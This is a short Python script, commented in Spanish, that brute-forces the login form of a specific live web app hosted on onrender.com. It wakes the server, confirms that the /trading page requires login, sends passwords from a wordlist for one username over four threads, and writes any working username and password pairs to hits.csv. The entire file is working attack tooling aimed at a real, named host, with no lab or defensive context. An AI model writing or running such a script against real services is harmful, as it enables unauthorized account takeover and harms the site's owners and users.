import sys,time,threading,csv,random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import requests
B="https://mi-web-python-fin0.onrender.com";L=B+"/login";C=B+"/trading"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0"
lock=threading.Lock();hits=[]
def sess():
    s=requests.Session();s.headers.update({"User-Agent":UA,"Referer":L,"Origin":B});return s
def es_login(r): return 'name="password"' in r.text or urlparse(r.url).path.rstrip("/")=="/login"
def wake():
    for _ in range(60):
        try:
            if 'name="password"' in sess().get(L,timeout=15).text:return
        except requests.RequestException:pass
        time.sleep(5)
    sys.exit("no despierta")
def probar(u,p):
    s=sess()
    try:
        s.post(L,data={"username":u,"password":p},timeout=30)
        ok=not es_login(s.get(C,timeout=20))
    except requests.RequestException:ok=False
    with lock:
        if ok: hits.append((u,p));print(f"\n[+] EXITO {u}:{p}\n")
    return ok
def main():
    wl=sys.argv[1];u=sys.argv[2]
    pw=[x.strip() for x in open(wl) if x.strip()]
    wake()
    r=sess().get(C,timeout=20)
    if not es_login(r): sys.exit(f"{C} NO esta protegida, dime y cambio la ruta")
    print(f"[ok] {C} protegida | {len(pw)} intentos")
    with ThreadPoolExecutor(max_workers=4) as ex:
        try:
            for f in [ex.submit(probar,u,p) for p in pw]: pass
        except KeyboardInterrupt:
            ex.shutdown(wait=False,cancel_futures=True);raise
    print(f"\n{len(hits)} hits")
    if hits:
        csv.writer(open("hits.csv","w",newline="")).writerows(hits)
        for h in hits: print(h[0]+":"+h[1])
if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print("\ncortado")
